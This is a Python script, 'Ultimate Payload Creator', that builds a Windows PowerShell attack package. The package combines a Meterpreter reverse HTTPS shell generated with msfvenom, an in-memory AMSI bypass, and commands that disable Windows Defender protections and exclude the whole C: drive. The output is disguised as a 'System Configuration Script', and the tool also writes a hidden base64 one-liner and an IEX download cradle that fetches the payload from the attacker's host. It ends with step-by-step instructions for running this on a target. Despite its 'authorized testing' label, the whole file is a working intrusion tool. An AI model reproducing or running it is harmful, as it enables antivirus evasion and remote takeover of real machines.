#!/usr/bin/env python3
"""
Ultimate Payload Creator
Combines: AMSI Bypass + Defender Disable + Obfuscated Payload
For Authorized Security Testing Only
"""

import subprocess
import sys
import os

def create_combined_payload(lhost, lport):
    """Create a single PowerShell script with all bypasses and payload"""

    print("[*] Creating Ultimate Combined Payload...")
    print(f"[*] LHOST: {lhost}")
    print(f"[*] LPORT: {lport}")
    print("")

    # Generate the base payload using msfvenom
    print("[1/4] Generating Meterpreter payload...")
    cmd = [
        "msfvenom",
        "-p", "windows/x64/meterpreter/reverse_https",
        f"LHOST={lhost}",
        f"LPORT={lport}",
        "-f", "psh-reflection"
    ]

    result = subprocess.run(cmd, capture_output=True, text=True)
    base_payload = result.stdout

    print("[+] Payload generated")

    # Create the ultimate combined script
    print("[2/4] Embedding AMSI bypass...")

    amsi_bypass = """
# AMSI Bypass
$a=[Ref].Assembly.GetTypes();Foreach($b in $a){if($b.Name -like "*iUtils"){$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d){if($e.Name -like "*Context"){$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1);
"""

    print("[3/4] Embedding Defender disable...")

    defender_disable = """
# Disable Defender (if admin)
try{
Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue;
Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue;
Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue;
Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue;
Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue;
Add-MpPreference -ExclusionPath "C:\\" -ErrorAction SilentlyContinue;
}catch{}
"""

    print("[4/4] Combining all components...")

    # Combine everything
    combined = f"""# System Configuration Script
# Initialization

{amsi_bypass}

{defender_disable}

# Execute Main Payload
{base_payload}
"""

    # Save the combined payload
    output_file = "/home/cyber/Downloads/FilelessMalwear/fileless/combined_payload.ps1"
    with open(output_file, 'w') as f:
        f.write(combined)

    print(f"[+] Created: {output_file}")

    # Create an encoded one-liner version
    print("")
    print("[*] Creating encoded one-liner...")

    import base64
    encoded = base64.b64encode(combined.encode('utf-16le')).decode()

    oneliner_file = "/home/cyber/Downloads/FilelessMalwear/fileless/combined_oneliner.txt"
    with open(oneliner_file, 'w') as f:
        f.write(f"powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc {encoded}")

    print(f"[+] Created: {oneliner_file}")

    # Create a download cradle version
    print("")
    print("[*] Creating download cradle...")

    cradle = f'powershell.exe -NoP -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString(\'http://{lhost}:8000/combined_payload.ps1\')"'

    cradle_file = "/home/cyber/Downloads/FilelessMalwear/fileless/combined_cradle.txt"
    with open(cradle_file, 'w') as f:
        f.write(cradle)

    print(f"[+] Created: {cradle_file}")

    print("")
    print("=" * 60)
    print("Ultimate Payload Creation Complete!")
    print("=" * 60)
    print("")
    print("Files created:")
    print(f"  1. {output_file}")
    print(f"  2. {oneliner_file}")
    print(f"  3. {cradle_file}")
    print("")
    print("Usage Options:")
    print("")
    print("Option 1: Direct Execution")
    print(f"  powershell.exe -ExecutionPolicy Bypass -File combined_payload.ps1")
    print("")
    print("Option 2: One-liner (copy from combined_oneliner.txt)")
    print("")
    print("Option 3: Download Cradle")
    print(f"  1. Start HTTP server: python3 -m http.server 8000")
    print(f"  2. On target, run command from combined_cradle.txt")
    print("")
    print("Remember: Start your Metasploit handler first!")
    print(f"  msfconsole -r handler.rc")
    print("")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 create_ultimate_payload.py <LHOST> [LPORT]")
        print("Example: python3 create_ultimate_payload.py 192.168.1.100 4444")
        sys.exit(1)

    lhost = sys.argv[1]
    lport = sys.argv[2] if len(sys.argv) > 2 else "4444"

    create_combined_payload(lhost, lport)
